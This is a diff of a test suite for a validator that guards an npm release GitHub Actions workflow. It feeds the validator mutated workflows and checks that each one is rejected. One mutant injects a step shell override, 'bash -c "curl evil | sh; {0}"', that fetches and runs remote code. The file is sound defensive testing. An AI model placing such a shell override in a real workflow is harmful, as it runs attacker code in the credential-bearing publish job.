@@ -37,12 +37,19 @@ describe('trusted release workflow', () => {
 	it('rejects trigger, permission, token, and source-publication widening', () => {
 		const mutants = [
 			workflow.replace("tags:\n      - 'svelte-adapter-uws@*'", 'branches: [main]'),
-			workflow.replace('id-token: write', 'id-token: read'),
+			// Anchored on the permissions block, not the bare token: the
+			// workflow header discusses `id-token: write` in prose, and a
+			// first-occurrence replace would mutate the comment instead.
+			workflow.replace('      contents: read\n      id-token: write', '      contents: read\n      id-token: read'),
 			workflow.replace('npm publish "', 'NODE_AUTH_TOKEN: secret\n        run: npm publish "'),
 			workflow.replace('${{ steps.pack.outputs.tarball }}', '.')
 		];
-		for (const mutant of mutants) {
-			expect(validateReleaseWorkflow(mutant, pkg, policy).length).toBeGreaterThan(0);
+		for (const [index, mutant] of mutants.entries()) {
+			// A mutant that did not change the source proves nothing: the
+			// assertion below would pass on an unmutated workflow only if the
+			// gate were broken, but a NO-OP replace makes it pass silently.
+			expect(mutant, 'mutant ' + index + ' did not change the workflow').not.toBe(workflow);
+			expect(validateReleaseWorkflow(mutant, pkg, policy).length, 'mutant ' + index).toBeGreaterThan(0);
 		}
 	});
 
@@ -68,7 +75,71 @@ describe('trusted release workflow', () => {
 		);
 		expect(injected).not.toBe(workflow);
 		expect(validateReleaseWorkflow(injected, pkg, policy).join('\n'))
-			.toContain('retained artifact pack body is not exact');
+			.toContain('"Pack retained artifact" has a non-exact run');
+	});
+
+	it('keeps the publication identity out of the job that installs and tests', () => {
+		// id-token: write is granted PER JOB. If the job that runs npm ci and
+		// the suite can also mint an OIDC token, every third-party lifecycle
+		// script in the tree can publish. The split is the control; this is the
+		// mutation that silently undoes it.
+		const armedVerify = workflow.replace(
+			'    permissions:\n      contents: read\n    outputs:',
+			'    permissions:\n      contents: read\n      id-token: write\n    outputs:'
+		);
+		expect(armedVerify).not.toBe(workflow);
+		expect(validateReleaseWorkflow(armedVerify, pkg, policy).join('\n'))
+			.toContain('verify job permissions must be exactly contents read');
+
+		// The other direction: the publish job growing an install step is how
+		// repository and dependency code re-enters the credential-bearing job.
+		const installingPublish = workflow.replace(
+			'      - name: Download the retained publication artifact',
+			'      - name: Install locked root dependencies\n        run: npm ci\n\n      - name: Download the retained publication artifact'
+		);
+		expect(installingPublish).not.toBe(workflow);
+		expect(validateReleaseWorkflow(installingPublish, pkg, policy).join('\n'))
+			.toContain('publish job steps must be exactly, in order');
+
+		// Dropping the dependency lets publish race verify and publish an
+		// artifact no gate ever produced.
+		const detached = workflow.replace('    needs: verify\n', '');
+		expect(detached).not.toBe(workflow);
+		expect(validateReleaseWorkflow(detached, pkg, policy).join('\n'))
+			.toContain('publish job must depend on the verify job');
+
+		// Collapsing back to one job is the whole regression in one edit.
+		const merged = workflow.replace('  verify:\n', '  release:\n');
+		expect(merged).not.toBe(workflow);
+		expect(validateReleaseWorkflow(merged, pkg, policy).join('\n'))
+			.toContain('exactly the verify and publish jobs');
+	});
+
+	it('rejects a shell override, which replaces the interpreter of an exact-matched command', () => {
+		// `shell:` is a command TEMPLATE, not a name: `bash -c "<attacker> {0}"`
+		// runs arbitrary code and then the pinned body, leaving the name, the
+		// order and the body untouched. Only the pack step may carry one.
+		const hijacked = workflow.replace(
+			'      - name: Publish exact tarball to quarantine with trusted OIDC\n        run: npm publish',
+			'      - name: Publish exact tarball to quarantine with trusted OIDC\n        shell: bash -c "curl evil | sh; {0}"\n        run: npm publish'
+		);
+		expect(hijacked).not.toBe(workflow);
+		expect(validateReleaseWorkflow(hijacked, pkg, policy).join('\n'))
+			.toContain('carries disallowed keys: shell');
+
+		const idAdded = workflow.replace(
+			'      - name: Install locked root dependencies\n        run: npm ci',
+			'      - name: Install locked root dependencies\n        id: pack\n        run: npm ci'
+		);
+		expect(idAdded).not.toBe(workflow);
+		expect(validateReleaseWorkflow(idAdded, pkg, policy).join('\n'))
+			.toContain('carries disallowed keys: id');
+
+		// The pack step's own shell is pinned to its value, not merely allowed.
+		const packShell = workflow.replace('        shell: pwsh\n', '        shell: bash\n');
+		expect(packShell).not.toBe(workflow);
+		expect(validateReleaseWorkflow(packShell, pkg, policy).join('\n'))
+			.toContain('has a non-exact shell');
 	});
 
 	it('rejects step-level keys that neutralize a step without touching name, order, or body', () => {
@@ -132,7 +203,7 @@ describe('trusted release workflow', () => {
 		);
 		expect(jobEnv).not.toBe(workflow);
 		expect(validateReleaseWorkflow(jobEnv, pkg, policy).join('\n'))
-			.toContain('release job carries disallowed keys: env');
+			.toContain('verify job key inventory is not exact');
 
 		const jobShell = workflow.replace(
 			'    timeout-minutes: 90',
@@ -140,7 +211,7 @@ describe('trusted release workflow', () => {
 		);
 		expect(jobShell).not.toBe(workflow);
 		expect(validateReleaseWorkflow(jobShell, pkg, policy).join('\n'))
-			.toContain('release job carries disallowed keys: defaults');
+			.toContain('verify job key inventory is not exact');
 
 		const jobContainer = workflow.replace(
 			'    timeout-minutes: 90',
@@ -148,7 +219,7 @@ describe('trusted release workflow', () => {
 		);
 		expect(jobContainer).not.toBe(workflow);
 		expect(validateReleaseWorkflow(jobContainer, pkg, policy).join('\n'))
-			.toContain('release job carries disallowed keys: container');
+			.toContain('verify job key inventory is not exact');
 
 		const workflowEnv = workflow.replace(
 			'permissions:\n  contents: read',
@@ -156,7 +227,7 @@ describe('trusted release workflow', () => {
 		);
 		expect(workflowEnv).not.toBe(workflow);
 		expect(validateReleaseWorkflow(workflowEnv, pkg, policy).join('\n'))
-			.toContain('release workflow carries disallowed keys: env');
+			.toContain('release workflow key inventory is not exact');
 	});
 
 	it('rejects an interposed step, a duplicated step name, and verify-before-install', () => {
@@ -175,7 +246,7 @@ describe('trusted release workflow', () => {
 			'      - name: Install OIDC-capable npm\n        run: echo shadowed\n\n      - name: Install OIDC-capable npm\n        run: npm install --global npm@11.5.1'
 		);
 		expect(duplicated).not.toBe(workflow);
-		expect(validateReleaseWorkflow(duplicated, pkg, policy).join('\n')).toContain('unique');
+		expect(validateReleaseWorkflow(duplicated, pkg, policy).join('\n')).toContain('exactly, in order');
 
 		// The verifier imports installed dependencies at module load, so it
 		// must run after npm ci - the previous order killed every tag push.
